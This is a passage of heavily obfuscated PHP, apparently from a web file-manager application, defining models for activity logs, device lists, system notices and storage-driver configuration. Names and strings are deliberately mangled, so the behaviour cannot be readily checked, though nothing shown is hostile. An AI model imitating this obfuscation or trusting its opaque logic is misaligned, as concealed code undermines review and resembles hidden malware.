strpos($¼Å‘Ã˜[$ò‹Ôš–æ[43]], $ò‹Ôš–æ[2646]) !== 0) { continue; } try { $øİæé¿ = IO::infoFullSimple($Î¾Ç¥Ş€[$ò‹Ôš–æ[97]]); } catch (Exception $¢ùª¡®¢) { continue; } $¢›¹¦[] = $Î¾Ç¥Ş€[$ò‹Ôš–æ[201]] = $øİæé¿[$ò‹Ôš–æ[201]]; $¢›¹¦[] = $Î¾Ç¥Ş€[$ò‹Ôš–æ[2414]] = $øİæé¿[$ò‹Ôš–æ[200]]; $‘˜†œıŸ[$úì´ ú][$ò‹Ôš–æ[549]] = json_encode($Î¾Ç¥Ş€); continue; } $¢›¹¦[] = $Î¾Ç¥Ş€[$ò‹Ôš–æ[201]]; $¢›¹¦[] = $Î¾Ç¥Ş€[$ò‹Ôš–æ[2414]]; if ($Î¾Ç¥Ş€[$ò‹Ôš–æ[43]] == $ò‹Ôš–æ[652]) { $¢›¹¦[] = $Î¾Ç¥Ş€[$ò‹Ôš–æ[549]][$ò‹Ôš–æ[1342]]; $¢›¹¦[] = $Î¾Ç¥Ş€[$ò‹Ôš–æ[549]][$ò‹Ôš–æ[1343]]; } if ($Î¾Ç¥Ş€[$ò‹Ôš–æ[43]] == $ò‹Ôš–æ[2424]) { $¢›¹¦[] = $Î¾Ç¥Ş€[$ò‹Ôš–æ[549]][$ò‹Ôš–æ[201]]; } } if (!$¢›¹¦) { return array(); } return Model($ò‹Ôš–æ[935])->sourceListInfo($¢›¹¦, !0); } private function logList($•ë¨·í) { $´í¢Íà =& $_SERVER[øşô´çË]; $Ö§ÒÉ… = array_to_keyvalue($•ë¨·í, $´í¢Íà[12], $´í¢Íà[1588]); $·…ÌÀó = Model($´í¢Íà[626])->userListInfo(array_unique($Ö§ÒÉ…)); $ÃŒş = $this->getSourceList($•ë¨·í); $·®¨‰Ô² = $this->typeAll(); $£îŞÃÍ« = array(); $Ò‰ÎÏÜä = array(); foreach ($•ë¨·í as $ëÌÅ¥üÍ => $Íõƒ³ÁÚ) { $ëÓ®‘ÆÔ = $Íõƒ³ÁÚ[$´í¢Íà[43]]; $Íø«ˆ„ã = isset($·…ÌÀó[$Íõƒ³ÁÚ[$´í¢Íà[1588]]]) ? $·…ÌÀó[$Íõƒ³ÁÚ[$´í¢Íà[1588]]] : !1; $÷£å¶Êà = strpos($ëÓ®‘ÆÔ, $´í¢Íà[2647]) === 0 ? LNG($´í¢Íà[2648]) : LNG($´í¢Íà[2644]); $Íõƒ³ÁÚ[$´í¢Íà[42]] = isset($Íø«ˆ„ã[$´í¢Íà[42]]) ? $Íø«ˆ„ã[$´í¢Íà[42]] : LNG($´í¢Íà[2644]); $Íõƒ³ÁÚ[$´í¢Íà[2472]] = isset($Íø«ˆ„ã[$´í¢Íà[2472]]) ? $Íø«ˆ„ã[$´í¢Íà[2472]] : $´í¢Íà[12]; $Íõƒ³ÁÚ[$´í¢Íà[1862]] = isset($·®¨‰Ô²[$ëÓ®‘ÆÔ]) ? $·®¨‰Ô²[$ëÓ®‘ÆÔ] : $÷£å¶Êà; $Íõƒ³ÁÚ[$´í¢Íà[2353]] = $Íø«ˆ„ã; $•ªÕßÑ = json_decode($Íõƒ³ÁÚ[$´í¢Íà[549]], !0); $Íõƒ³ÁÚ[$´í¢Íà[1604]] = isset($•ªÕßÑ[$´í¢Íà[1604]]) ? $•ªÕßÑ[$´í¢Íà[1604]] : $´í¢Íà[12]; $Íõƒ³ÁÚ[$´í¢Íà[2645]] = IpLocation::get($Íõƒ³ÁÚ[$´í¢Íà[1604]]); if (strpos($ëÓ®‘ÆÔ, $´í¢Íà[2416]) === 0 || isset($•ªÕßÑ[$´í¢Íà[2414]])) { $•ªÕßÑ[$´í¢Íà[100]] = $ÃŒş[$•ªÕßÑ[$´í¢Íà[201]]]; $•ªÕßÑ[$´í¢Íà[2430]] = $ÃŒş[$•ªÕßÑ[$´í¢Íà[2414]]]; if ($•ªÕßÑ[$´í¢Íà[43]] == $´í¢Íà[652]) { $•ªÕßÑ[$´í¢Íà[549]][$´í¢Íà[1342]] = $ÃŒş[$•ªÕßÑ[$´í¢Íà[549]][$´í¢Íà[1342]]]; $•ªÕßÑ[$´í¢Íà[549]][$´í¢Íà[1343]] = $ÃŒş[$•ªÕßÑ[$´í¢Íà[549]][$´í¢Íà[1343]]]; } if ($•ªÕßÑ[$´í¢Íà[43]] == $´í¢Íà[2424]) { $•ªÕßÑ[$´í¢Íà[549]][$´í¢Íà[201]] = $ÃŒş[$•ªÕßÑ[$´í¢Íà[549]][$´í¢Íà[201]]]; } if ($•ªÕßÑ[$´í¢Íà[43]] == $´í¢Íà[1330]) { $•ªÕßÑ[$´í¢Íà[2430]] = $•ªÕßÑ[$´í¢Íà[100]]; $•ªÕßÑ[$´í¢Íà[2414]] = $•ªÕßÑ[$´í¢Íà[2430]][$´í¢Íà[201]]; $•ªÕßÑ[$´í¢Íà[100]] = !1; $•ªÕßÑ[$´í¢Íà[201]] = $´í¢Íà[12]; } $’‹¾º·Ã = array($´í¢Íà[1330], $´í¢Íà[2412]); if (!in_array($•ªÕßÑ[$´í¢Íà[43]], $’‹¾º·Ã)) { if ($•ªÕßÑ[$´í¢Íà[100]] && $•ªÕßÑ[$´í¢Íà[100]][$´í¢Íà[198]] == $´í¢Íà[199]) { $Ò‰ÎÏÜä[] = $Íõƒ³ÁÚ[$´í¢Íà[496]]; unset($•ë¨·í[$ëÌÅ¥üÍ]); continue; } if ($•ªÕßÑ[$´í¢Íà[2430]] && $•ªÕßÑ[$´í¢Íà[2430]][$´í¢Íà[198]] == $´í¢Íà[199]) { $Ò‰ÎÏÜä[] = $Íõƒ³ÁÚ[$´í¢Íà[496]]; unset($•ë¨·í[$ëÌÅ¥üÍ]); continue; } } } $Íõƒ³ÁÚ[$´í¢Íà[549]] = $•ªÕßÑ; unset($Íõƒ³ÁÚ[$´í¢Íà[2649]]); $£îŞÃÍ«[] = $Íõƒ³ÁÚ; } $this->clearSystemPathLog($Ò‰ÎÏÜä); return $£îŞÃÍ«; } private function clearSystemPathLog($ÈßÏ¥°ó) { $Øµ‹şè =& $_SERVER[øşô´çË]; if (count($ÈßÏ¥°ó) == 0) { return; } $æü©©Ô¸ = array($Øµ‹şè[496] => array($Øµ‹şè[7], array_unique($ÈßÏ¥°ó))); $this->where($æü©©Ô¸)->delete(); } public function deviceList($ˆØ Ş¤¥, $«ëÁ«„ã = 0) { $äúêî =& $_SERVER[øşô´çË]; $Áä²´®´ = array($äúêî[1588] => $ˆØ Ş¤¥, $äúêî[241] => array($äúêî[1178], $«ëÁ«„ã), $äúêî[43] => $äúêî[2124]); $ã€³ÒÓÈ = array(); $ÔÉıü‹ = $this->field($äúêî[2650])->where($Áä²´®´)->order($äúêî[2428])->limit(50)->select(); foreach ($ÔÉıü‹ as $ÅŒá’ÑÀ => $ŠÖÀ¿Åµ) { if ($ÅŒá’ÑÀ > 0 && abs($ŠÖÀ¿Åµ[$äúêî[241]] - $ÔÉıü‹[$ÅŒá’ÑÀ - 1][$äúêî[241]]) < 5) { continue; } $ÌÁˆ± = json_decode($ŠÖÀ¿Åµ[$äúêî[549]], !0); $ŠÖÀ¿Åµ[$äúêî[1604]] = isset($ÌÁˆ±[$äúêî[1604]]) ? $ÌÁˆ±[$äúêî[1604]] : $äúêî[12]; unset($ÌÁˆ±[$äúêî[1604]]); $›‰ñ–Šñ = $this->deviceType($ÌÁˆ±[$äúêî[2417]]); if (isset($ã€³ÒÓÈ[$›‰ñ–Šñ])) { continue; } $ŠÖÀ¿Åµ[$äúêî[2645]] = IpLocation::get($ŠÖÀ¿Åµ[$äúêî[1604]]); $ŠÖÀ¿Åµ[$äúêî[549]] = $ÌÁˆ±; $ã€³ÒÓÈ[$›‰ñ–Šñ] = $ŠÖÀ¿Åµ; } return array_values($ã€³ÒÓÈ); } public function deviceType($ñ¬çÌ‡‘) { return $ñ¬çÌ‡‘; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\x6e\x6f\x74\151\143\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x63\x6f\156\x74\x65\156\164", "\x61\165\x74\x68", "\x6d\157\144\145", "\x74\x69\155\145", "\x74\x79\x70\145", "\x6c\x65\166\145\154", "\x65\156\x61\142\x6c\x65", "\x73\x6f\162\x74"); public function listData($å¬×ØÜû = false, $ÓàúªÔ¢ = "\163\x6f\x72\164", $¾È§¿¶ = false) { return parent::listData($å¬×ØÜû, $ÓàúªÔ¢, $¾È§¿¶); } public function add($’ÎÈòØ’) { $¹Êüõ¾Œ =& $_SERVER[øşô´çË]; $àñ„ó¨ = time(); if ($’ÎÈòØ’[$¹Êüõ¾Œ[26]] == $¹Êüõ¾Œ[2651]) { $àñ„ó¨ = strtotime($’ÎÈòØ’[$¹Êüõ¾Œ[214]]); } $’ÎÈòØ’[$¹Êüõ¾Œ[214]] = $àñ„ó¨; return parent::insert($’ÎÈòØ’); } public function update($„Í¶Ø¸Õ, $¼´ÙÄôó) { $€Şâ»ªÔ =& $_SERVER[øşô´çË]; $à°à² = $this->listData($„Í¶Ø¸Õ); if (!$à°à²) { return !1; } $µş·æéÜ = time(); if ($¼´ÙÄôó[$€Şâ»ªÔ[26]] == $€Şâ»ªÔ[2651]) { $µş·æéÜ = strtotime($¼´ÙÄôó[$€Şâ»ªÔ[214]]); } $¼´ÙÄôó[$€Şâ»ªÔ[214]] = $µş·æéÜ; return parent::update($„Í¶Ø¸Õ, $¼´ÙÄôó); } public function remove($Š„•Ş) { $İÄ¨æ‡ = $this->listData($Š„•Ş); if (!$İÄ¨æ‡ || $İÄ¨æ‡[$_SERVER[øşô´çË][199]]) { return !1; } return parent::remove($Š„•Ş); } public function sort($ûÂôÅŞå, $ô˜ö—‹) { return parent::update($ûÂôÅŞå, $ô˜ö—‹); } public function enable($âû”úÜ‰, $ó¼—Áš) { return parent::update($âû”úÜ‰, array($_SERVER[øşô´çË][2652] => $ó¼—Áš)); } private function initUserOption() { $ËÎÒş’ =& $_SERVER[øşô´çË]; $this->optionType = $ËÎÒş’[2653]; $this->modelType = $ËÎÒş’[2654]; $this->field = array($ËÎÒş’[2655], $ËÎÒş’[42], $ËÎÒş’[214], $ËÎÒş’[43], $ËÎÒş’[2656], $ËÎÒş’[852], $ËÎÒş’[236]); } public function userNoticeGet($‘ïÓÁ¶Î = false) { $this->initUserOption(); return parent::listData($‘ïÓÁ¶Î, $_SERVER[øşô´çË][496], !0); } public function userNoticeAdd($œÃÛª’§) { $õ¯‡À§ =& $_SERVER[øşô´çË]; $this->initUserOption(); $îù·ı® = $this->findByKey($õ¯‡À§[2655], $œÃÛª’§[$õ¯‡À§[496]]); if ($îù·ı®) { return !0; } $±¡³ğš¾ = array($õ¯‡À§[2655] => $œÃÛª’§[$õ¯‡À§[496]], $õ¯‡À§[42] => $œÃÛª’§[$õ¯‡À§[42]], $õ¯‡À§[214] => $œÃÛª’§[$õ¯‡À§[214]], $õ¯‡À§[43] => isset($œÃÛª’§[$õ¯‡À§[43]]) ? $œÃÛª’§[$õ¯‡À§[43]] : 1, $õ¯‡À§[2656] => isset($œÃÛª’§[$õ¯‡À§[2656]]) ? $œÃÛª’§[$õ¯‡À§[2656]] : 0, $õ¯‡À§[852] => 0, $õ¯‡À§[236] => 0); return parent::insert($±¡³ğš¾); } public function userNoticeEdit($¶ùÕÉåŸ, $Ş™±°Ï) { $this->initUserOption(); return parent::update($¶ùÕÉåŸ, $Ş™±°Ï); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\x65\155\137\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array("\155\145\156\165", "\x72\x6f\x6c\x65", "\x72\157\x6c\145\107\x72\x6f\165\x70", "\x72\145\x67\151\163\164", "\145\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($ÂãÓí¶²) { return "\x53\171\163\164\x65\x6d\117\160\x74\151\x6f\x6e\x5f{$ÂãÓí¶²}"; } protected function optionDefault($Ê±‡çô³ = '') { $ß¡ˆàË± =& $_SERVER[øşô´çË]; if ($Ê±‡çô³ == $ß¡ˆàË±[12]) { return $GLOBALS[$ß¡ˆàË±[6]][$ß¡ˆàË±[477]]; } } } goto EÑŞİ…ƒ‡; BÖÒ–”ÕàŞ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\163\157\165\x72\x63\x65\123\145\143\x72\x65\x74\114\151\x73\164"; public $field = array("\163\x6f\165\x72\x63\x65\111\x44", "\164\171\160\x65\x49\x44", "\143\x72\145\141\164\145\125\x73\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x73\x74\x6f\x72\x61\147\x65\x4c\x69\x73\164"; public $field = array("\x6e\141\x6d\145", "\163\x69\172\145\115\x61\170", "\163\171\x73\164\145\155", "\144\x65\146\x61\165\x6c\x74", "\x64\162\151\x76\x65\162", "\x63\x6f\x6e\x66\151\x67"); public function listData($Ğ€¡œı = false, $‡¶ö¢äÆ = "\x6d\x6f\x64\151\146\171\124\x69\x6d\145", $íù©¡« = false) { $ÉÈŠ­ÍÁ =& $_SERVER[øşô´çË]; $ôƒÓÅöœ = parent::listData($Ğ€¡œı, $‡¶ö¢äÆ, $íù©¡«); if ($Ğ€¡œı) { return $ôƒÓÅöœ; } $úÕäÃÖ = array(); if ($GLOBALS[$ÉÈŠ­ÍÁ[2509]]) { $úÕäÃÖ = $this->ioSizeUseGet(array_to_keyvalue($ôƒÓÅöœ, $ÉÈŠ­ÍÁ[12], $ÉÈŠ­ÍÁ[496])); } foreach ($ôƒÓÅöœ as $Ó®ÜÌ¿Û => $ƒŸÜò­§) { unset($ôƒÓÅöœ[$Ó®ÜÌ¿Û][$ÉÈŠ­ÍÁ[6]]); $ôƒÓÅöœ[$Ó®ÜÌ¿Û][$ÉÈŠ­ÍÁ[2166]] = isset($úÕäÃÖ[$ƒŸÜò­§[$ÉÈŠ­ÍÁ[496]]]) ? $úÕäÃÖ[$ƒŸÜò­§[$ÉÈŠ­ÍÁ[496]]] : 0; } return $ôƒÓÅöœ; } public function ioSizeUseGet($œ¿¥¯Â«) { $°‹İ‚°¥ =& $_SERVER[øşô´çË]; if (!$œ¿¥¯Â«) { return array(); } $™ Üöª = $°‹İ‚°¥[2510] . implode($°‹İ‚°¥[60], $œ¿¥¯Â«); $¦Ö·˜œ = Cache::get($™ Üöª); if ($¦Ö·˜œ) { return $¦Ö·˜œ; } $‡°”°Ş = array($°‹İ‚°¥[928] => $°‹İ‚°¥[496], $°‹İ‚°¥[2511] => $°‹İ‚°¥[89]); $êßù—®™ = array($°‹İ‚°¥[928] => array($°‹İ‚°¥[7], $œ¿¥¯Â«)); $¦Ö·˜œ = Model($°‹İ‚°¥[918])->field($‡°”°Ş)->where($êßù—®™)->group($°‹İ‚°¥[928])->select(); $¦Ö·˜œ = array_to_keyvalue($¦Ö·˜œ, $°‹İ‚°¥[496], $°‹İ‚°¥[89]); Cache::set($™ Üöª, $¦Ö·˜œ, 600); return $¦Ö·˜œ; } public function getConfig($é…ç†§) { $ğï”ÏÙ¥ = parent::listData($é…ç†§); $ïôÓ„¯Ş = _get($ğï”ÏÙ¥, $_SERVER[øşô´çË][6], array()); if ($ïôÓ„¯Ş && !is_array($ïôÓ„¯Ş)) { $ïôÓ„¯Ş = json_decode($ïôÓ„¯Ş, !0); } return $ïôÓ„¯Ş; } public function update($½¢æş¤, $šĞ°Ô÷) { $›Ö°ÎÍĞ =& $_SERVER[øşô´çË]; $Ç©îñ¯Í = $šĞ°Ô÷[$›Ö°ÎÍĞ[42]]; $ëûúëÒí = array_to_keyvalue(parent::listData(), $›Ö°ÎÍĞ[42]); if (isset($ëûúëÒí[$Ç©îñ¯Í]) && $ëûúëÒí[$Ç©îñ¯Í][$›Ö°ÎÍĞ[496]] != $½¢æş¤) { return !1; } $this->checkPwd($½¢æş¤, $šĞ°Ô÷); if (isset($šĞ°Ô÷[$›Ö°ÎÍĞ[2512]]) && $šĞ°Ô÷[$›Ö°ÎÍĞ[2512]] == $›Ö°ÎÍĞ[101]) { $this->checkConfig($šĞ°Ô÷); } unset($šĞ°Ô÷[$›Ö°ÎÍĞ[2512]]); $Î–™ïÇ = parent::update($½¢æş¤, $šĞ°Ô÷); if ($Î–™ïÇ && $šĞ°Ô÷[$›Ö°ÎÍĞ[47]]) { foreach ($ëûúëÒí as $¶ùÌ€Šß) { if ($¶ùÌ€Šß[$›Ö°ÎÍĞ[47]] && $¶ùÌ€Šß[$›Ö°ÎÍĞ[496]] != $½¢æş¤) { parent::update($¶ùÌ€Šß[$›Ö°ÎÍĞ[496]], array($›Ö°ÎÍĞ[47] => 0)); } } $this->updateBackup($½¢æş¤, $ëûúëÒí); } return $Î–™ïÇ; } public function add($“ü¤ü¥¾) { $÷©ã¨Ê  =& $_SERVER[øşô´çË]; $ŞÇµšö„ = array_to_keyvalue(parent::listData(), $÷©ã¨Ê [42]); if (isset($ŞÇµšö„[$“ü¤ü¥¾[$÷©ã¨Ê [42]]])) { return !1; } $this->checkConfig($“ü¤ü¥¾); $úœ·ËúÊ = parent::insert($“ü¤ü¥¾); if ($úœ·ËúÊ && $“ü¤ü¥¾[$÷©ã¨Ê [47]]) { foreach ($ŞÇµšö„ as $¬öÂ•±Ò) { if ($¬öÂ•±Ò[$÷©ã¨Ê [47]]) { parent::update($¬öÂ•±Ò[$÷©ã¨Ê [496]], array($÷©ã¨Ê [47] => 0)); } } $this->updateBackup($úœ·ËúÊ, $ŞÇµšö„); } return $úœ·ËúÊ; } public function updateBackup($ØïŞš›, $üÖõÉæ¥) { $÷½í«· =& $_SERVER[øşô´çË]; $’ê„¥µ = Model($÷½í«·[875])->get($÷½í«·[881]); $’ê„¥µ = json_decode($’ê„¥µ, !0); if (!$’ê„¥µ) { return; } if ($’ê„¥µ[$÷½í«·[1943]] != $÷½í«·[101]) { return; } $ËîŠ²ë = $’ê„¥µ[$÷½í«·[854]]; if ($’ê„¥µ[$÷½í«·[178]] != $÷½í«·[1304]) { if ($ËîŠ²ë != $ØïŞš›) { return; } $’ê„¥µ[$÷½í«·[178]] = $÷½í«·[1304]; } else { if ($ËîŠ²ë == $ØïŞš›) { return; } $’ê„¥µ[$÷½í«·[854]] = $ØïŞš›; } Model($÷½í«·[875])->set(array($÷½í«·[881] => $’ê„¥µ)); } public function checkPwd($™µ±’Úç, &$»‹µ÷ôº) { $—€£‚ î =& $_SERVER[øşô´çË]; if (empty($»‹µ÷ôº[$—€£‚ î[6]])) { return; } $—£Çôãã = $»‹µ÷ôº[$—€£‚ î[6]]; if (!is_array($—£Çôãã)) { $—£Çôãã = json_decode($—£Çôãã, !0); } $åéÍÌ¥× = $—€£‚ î[12]; $êËÏâÂˆ = array($—€£‚ î[1637], $—€£‚ î[2513], $—€£‚ î[1047]); foreach ($êËÏâÂˆ as $ñµ¨ÒÔ) { if (isset($—£Çôãã[$ñµ¨ÒÔ])) { $åéÍÌ¥× = $ñµ¨ÒÔ; break; } } if (!$åéÍÌ¥×) { return; } $ÈŞ¸Åş = $this->getConfig($™µ±’Úç); $œïØùŸ™ = $ÈŞ¸Åş[$åéÍÌ¥×]; $ëĞ©ó¡Ø = $—£Çôãã[$åéÍÌ¥×]; if ($ëĞ©ó¡Ø == str_repeat($—€£‚ î[230], strlen($œïØùŸ™))) { $—£Çôãã[$åéÍÌ¥×] = $œïØùŸ™; $»‹µ÷ôº[$—€£‚ î[6]] = json_encode($—£Çôãã); } else { if ($ëĞ©ó¡Ø != $œïØùŸ™) { $»‹µ÷ôº[$—€£‚ î[2512]] = $—€£‚ î[101]; } } } public function checkConfig(&$çµÜÒğ‰, $¹Í°àĞñ = false) { $â¼©Í•Å =& $_SERVER[øşô´çË]; $‡š¬Ê»’ = strtolower($çµÜÒğ‰[$â¼©Í•Å[106]]); $ËØ–Î„ı = $çµÜÒğ‰[$â¼©Í•Å[6]]; if (!is_array($ËØ–Î„ı)) { $ËØ–Î„ı = json_decode($ËØ–Î„ı, !0); } foreach ($ËØ–Î„ı as $÷ª¬°Ù› => $ª¹ÛûùÆ) { if (is_string($ª¹ÛûùÆ)) { $ËØ–Î„ı[$÷ª¬°Ù›] = trim($ª¹ÛûùÆ); } } $ËØ–Î„ı[$â¼©Í•Å[2514]] = rand_string(6); $ñ—âØ¨ = $GLOBALS[$â¼©Í•Å[6]][$â¼©Í•Å[102]][$â¼©Í•Å[936]]; $Ö´ĞÇ‚÷ = isset($ñ—âØ¨[$‡š¬Ê»’]) ? $ñ—âØ¨[$‡š¬Ê»’] : ucfirst($‡š¬Ê»’); $·óü…³£ = $â¼©Í•Å[87] . $Ö´ĞÇ‚÷; if (!$Ö´ĞÇ‚÷ || !class_exists($·óü…³£)) { if ($¹Í°àĞñ) { return LNG($â¼©Í•Å[2515]); } write_log(array($â¼©Í•Å[2516], $çµÜÒğ‰, get_caller_info()), $â¼©Í•Å[223]); show_json(LNG($â¼©Í•Å[2515]), !1, $çµÜÒğ‰); } $¯ğ»®š¥ = new $·óü…³£($ËØ–Î„ı); $ü»¶«õ = rtrim($ËØ–Î„ı[$â¼©Í•Å[1365]], $â¼©Í•Å[8]) . $â¼©Í•Å[8]; if (in_array($‡š¬Ê»’, $¯ğ»®š¥->objectDriver)) { try { if (!$¯ğ»®š¥->isBucketCors() && !$¯ğ»®š¥->setBucketCors()) { $ğÎŸªöÑ = LNG($â¼©Í•Å[2517]); $ğÎŸªöÑ .= $â¼©Í•Å[2518] . LNG($â¼©Í•Å[2519]); } } catch (Exception $¥Ô ‹‹¶) { $ğÎŸªöÑ = $¥Ô ‹‹¶->getMessage(); } if (isset($ğÎŸªöÑ)) { return $this->_parseError($ğÎŸªöÑ, $‡š¬Ê»’, $¹Í°àĞñ); } if ($‡š¬Ê»’ == $â¼©Í•Å[78]) { $ı€ŞõÁ = $¯ğ»®š¥->getBktRegion(); if ($ı€ŞõÁ != $ËØ–Î„ı[$â¼©Í•Å[2520]]) { $ËØ–Î„ı[$â¼©Í•Å[2520]] = $ı€ŞõÁ; $¯ğ»®š¥->setRegion($ı€ŞõÁ); } } } else { if ($‡š¬Ê»’ == $â¼©Í•Å[2521]) { if ($¯ğ»®š¥->ftpPath) { $ù·ìéàÀ = trim($ü»¶«õ, $â¼©Í•Å[8]); if (stripos($ù·ìéàÀ, trim($¯ğ»®š¥->ftpPath, $â¼©Í•Å[8])) !== 0) { $ü»¶«õ = $¯ğ»®š¥->ftpPath . $â¼©Í•Å[8] . ($ù·ìéàÀ ? $ù·ìéàÀ . $â¼©Í•Å[8] : $â¼©Í•Å[12]); } } } } $ò Â½‰¾ = $¯ğ»®š¥->getPath($ü»¶«õ . $â¼©Í•Å[1369]); try { if ($‡š¬Ê»’ == $â¼©Í•Å[116]) { $¯ğ»®š¥->mkdir($ü»¶«õ, REPEAT_SKIP); } $Š›å÷Ïº = $¯ğ»®š¥->mkfile($ò Â½‰¾, $â¼©Í•Å[12], REPEAT_REPLACE); if (!$Š›å÷Ïº) { $ğÎŸªöÑ = LNG($â¼©Í•Å[2517]); } } catch (Exception $¥Ô ‹‹¶) { $ğÎŸªöÑ = $¥Ô ‹‹¶->getMessage(); } if (isset($ğÎŸªöÑ)) { return $this->_parseError($ğÎŸªöÑ, $‡š¬Ê»’, $¹Í°àĞñ); } $ËØ–Î„ı[$â¼©Í•Å[1365]] = $ü»¶«õ; $çµÜÒğ‰[$â¼©Í•Å[6]] = json_encode($ËØ–Î„ı); $çµÜÒğ‰[$â¼©Í•Å[106]] = $Ö´ĞÇ‚÷; return !0; } private function _parseError($¬â§ùÄ¦, $É¾®¨ä, $ıä¯—õÇ = false) { $ùšË÷ =& $_SERVER[øşô´çË]; if ($É¾®¨ä == $ùšË÷[78] && stripos($¬â§ùÄ¦, $ùšË÷[2522])) { $€‹«ßıÕ = explode($ùšË÷[10], $¬â§ùÄ¦); $êÂ­ÔœÔ = isset($€‹«ßıÕ[1]) ? $€‹«ßıÕ[1] : $ùšË÷[12]; $ úµéØ³ = array($ùšË÷[2523] => LNG($ùšË÷[2524]), $ùšË÷[2525] => LNG($ùšË÷[2526])); if (isset($ úµéØ³[$êÂ­ÔœÔ])) { $¬â§ùÄ¦ = $ úµéØ³[$êÂ­ÔœÔ]; } } if (stripos($¬â§ùÄ¦, $ùšË÷[2527]) === 0) { $±™ÙÛ¤Ò = strpos($¬â§ùÄ¦, $ùšË÷[185]); if ($±™ÙÛ¤Ò === !1) { $±™ÙÛ¤Ò = strpos($¬â§ùÄ¦, $ùšË÷[4]); } if ($±™ÙÛ¤Ò !== !1) { $¬â§ùÄ¦ = substr($¬â§ùÄ¦, $±™ÙÛ¤Ò + 1); } } $¬â§ùÄ¦ = LNG($ùšË÷[1372]) . $¬â§ùÄ¦; if ($ıä¯—õÇ) { return $¬â§ùÄ¦; } show_json($¬â§ùÄ¦, !1); } public function driverListSystem() { $ë¶˜ÅåÎ =& $_SERVER[øşô´çË]; $–ª¾šó± = parent::listData(); $İ‹²ß•é = array(); foreach ($–ª¾šó± as $µ¿¥ê«¾) { unset($µ¿¥ê«¾[$ë¶˜ÅåÎ[241]], $µ¿¥ê«¾[$ë¶˜ÅåÎ[98]]); if (!is_array($µ¿¥ê«¾[$ë¶˜ÅåÎ[6]])) { $µ¿¥ê«¾[$ë¶˜ÅåÎ[6]] = json_decode($µ¿¥ê«¾[$ë¶˜ÅåÎ[6]], !0); } $İ‹²ß•é[] = $µ¿¥ê«¾; } return $İ‹²ß•é; } public function defaultDriver() { $“‹Å‘Ó =& $_SERVER[øşô´çË]; $ìíÇéœ¡ = parent::listData(); $é’œ´•¨ = array_filter_by_field($ìíÇéœ¡, $“‹Å‘Ó[47], 1); $é’œ´•¨ = $é’œ´•¨[0]; if (!$é’œ´•¨) { return array(); } if (!is_array($é’œ´•¨[$“‹Å‘Ó[6]])) { $é’œ´•¨[$“‹Å‘Ó[6]] = json_decode($é’œ´•¨[$“‹Å‘Ó[6]], !0); } return $é’œ´•¨; } public function driverInfo($ğ”çÈ²) { $çÚ—Š =& $_SERVER[øşô´çË]; $ÒÄ™—Á¢ = array_to_keyvalue(parent::listData(), $çÚ—Š[496]); if (!isset($ÒÄ™—Á¢[$ğ”çÈ²])) { return !1; } $üšÎ®£ = $ÒÄ™—Á¢[$ğ”çÈ²]; if (!is_array($üšÎ®£[$çÚ—Š[6]])) { $üšÎ®£[$çÚ—Š[6]] = json_decode($üšÎ®£[$çÚ—Š[6]], !0); } return $üšÎ®£; } public function remove($Ø†Şå™Ò) { $this->removeShareItems($Ø†Şå™Ò); return parent::remove($Ø†Şå™Ò); } public function removeWithFile($µ¼íÁÎ‘, $¿©¼™ëº, $®Óìüœı, $ã£ÇÚöÉ = false) { $Ñé¹Ü¥ƒ =& $_SERVER[øşô´çË]; ignore_timeout(); $³íçŒ¢± = array($Ñé¹Ü¥ƒ[928] => $µ¼íÁÎ‘); $¢ùûšğé = Model($Ñé¹Ü¥ƒ[569]); if (isset($GLOBALS[$Ñé¹Ü¥ƒ[2528]])) { $…÷îÄà‡ = $GLOBALS[$Ñé¹Ü¥ƒ[2528]]; } else { $…÷îÄà‡ = $¢ùûšğé->where($³íçŒ¢±)->field(array($Ñé¹Ü¥ƒ[951] => $Ñé¹Ü¥ƒ[952], $Ñé¹Ü¥ƒ[953] => $Ñé¹Ü¥ƒ[89]))->find(); } $ÏšÂÄ“ˆ = intval($…÷îÄà‡[$Ñé¹Ü¥ƒ[952]]); $ñ’áÛÌ¼ = intval($…÷îÄà‡[$Ñé¹Ü¥ƒ[89]]); $²±©òğÖ = $¿©¼™ëº . $Ñé¹Ü¥ƒ[2529] . $µ¼íÁÎ‘; $õ„Ò Ş = LNG($¿©¼™ëº == $Ñé¹Ü¥ƒ[652] ? $Ñé¹Ü¥ƒ[2530] : $Ñé¹Ü¥ƒ[2531]); $åŒìÒê = new TaskFileTransfer($²±©òğÖ, $Ñé¹Ü¥ƒ[223], $ÏšÂÄ“ˆ, $õ„Ò Ş . $Ñé¹Ü¥ƒ[485] . $®Óìüœı[$Ñé¹Ü¥ƒ[42]] . $Ñé¹Ü¥ƒ[222] . $µ¼íÁÎ‘); $åŒìÒê->task[$Ñé¹Ü¥ƒ[866]] = (double) $ñ’áÛÌ¼; $Ï˜—§ôë = KodIO::defaultDriver(); $½²ğó÷ = $Ï˜—§ôë[$Ñé¹Ü¥ƒ[496]]; $øó½¥×± = 1; $¡ŸÖÏ—ù = 5000; $‘êÊŸ«Ù = $¾ğŸèÑ„ = $ç¹õÏÉ = array(); $ìÓşÚôé = $¢ùûšğé->where($³íçŒ¢±)->field($Ñé¹Ü¥ƒ[2532])->selectPage($¡ŸÖÏ—ù, $øó½¥×±); $‰“¶ŠìÓ = intval($ìÓşÚôé[$Ñé¹Ü¥ƒ[452]][$Ñé¹Ü¥ƒ[454]]); while ($ìÓşÚôé && $øó½¥×± <= $‰“¶ŠìÓ) { foreach ($ìÓşÚôé[$Ñé¹Ü¥ƒ[455]] as $¾Íî€Ûë) { $ø¢‡°½Ê = $¾Íî€Ûë[$Ñé¹Ü¥ƒ[566]]; if ($ã£ÇÚöÉ) { $¾ğŸèÑ„[] = $ø¢‡°½Ê; continue; } $Í»´Úƒ« = $¾Íî€Ûë[$Ñé¹Ü¥ƒ[97]]; $­ŒÅÖ±œ = rtrim(get_path_father($Í»´Úƒ«), $Ñé¹Ü¥ƒ[8]) . $Ñé¹Ü¥ƒ[8]; $ç¹õÏÉ[] = $­ŒÅÖ±œ; $­ŒÅÖ±œ = str_replace("\x7b\x69\x6f\72{$µ¼íÁÎ‘}\175\57", 